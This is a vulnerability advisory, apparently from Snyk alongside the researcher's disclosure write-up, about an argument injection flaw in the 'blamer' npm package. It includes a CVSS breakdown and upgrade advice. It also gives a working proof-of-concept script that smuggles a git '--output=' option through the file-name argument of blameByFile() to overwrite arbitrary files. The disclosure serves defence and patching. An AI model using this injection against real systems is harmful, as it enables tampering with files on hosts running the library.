## How to fix?

Upgrade `blamer` to version 1.0.4 or higher.

## Overview

[blamer](https://www.npmjs.com/package/blamer) is a tool for get information about author of code from version control system. Supports git and subversion.

Affected versions of this package are vulnerable to Arbitrary Argument Injection via the `blameByFile()` API. The library does not sanitize for user input or validate the given file path conforms to a specific schema, nor does it properly pass command-line flags to the `git` binary using the double-dash POSIX characters (`--`) to communicate the end of options.

## PoC

```
import Blamer from "blamer";
const blamer = new Blamer.default("git");

async function main() {
  const file = "--output=/tmp/r2d2";
  const result = await blamer.blameByFile(file);
  console.log("Blame json: %j", result);
}

main();

```

### CVSS Scores

version 3.1
### Snyk

6.5 medium

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is no loss of confidentiality within the impacted component.

  **None**
* Integrity (I)

  Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is limited. The data modification does not have a direct, serious impact on the impacted component.

  **Low**
* Availability (A)

  Performance is reduced or there are interruptions in resource availability. Even if repeated exploitation of the vulnerability is possible, the attacker does not have the ability to completely deny service to legitimate users. The resources in the impacted component are either partially available all of the time, or fully available only some of the time, but overall there is no direct, serious consequence to the impacted component.

  **Low**

Argument Injection vulnerability in `blamer@1.0.1`

 [Raw](/lirantal/14c3686370a86461f555d3f0703e02f9/raw/09d242c2d561e7a10f799cd5f1d70043500b27da/blamer-argument-injection.md)

# Argument Injection vulnerability in `blamer@1.0.1`

`blamer` describes itself as:

```
Blamer is a tool for get information about author of code from version control system. Supports git and subversion.

```

Resources:

* Project's GitHub source code: <https://github.com/kucherenko/blamer>
* Project's npm package: <https://www.npmjs.com/package/blamer>

## Background on exploitation

I'm reporting an Argument Injection vulnerability in `blamer` npm package.

This vulnerability manifests with the library's `blameByFile()` API,
which allows specifying the file path to run `git blame` on. However, the library
does not sanitize for user input or validate the given file path conforms to specific schema,
nor does it properly pass command-line flags to the `git` binary using the double-dash
POSIX characters (`--`) to communicate the end of options.

Thus, allowing users to exploit an argument injection vulnerability in Git due to the
`--output=` command-line option that results with overwriting arbitrary files.

## Exploit

1. Install `blamer@1.0.1` or earlier
2. Initiaizlie a new Git directory with commits in it
3. Create the following script in that directory:

```
// you might need to set `type: module` in `package.json`
// if you're running this as a Node.js script initializex
// in an npm project

import Blamer from "blamer";
const blamer = new Blamer.default("git");

async function main() {
  const file = "--output=/tmp/r2d2";
  const result = await blamer.blameByFile(file);
  console.log("Blame json: %j", result);
}

main();
```

3. Observe new file created on disk at `/tmp/r2d2`
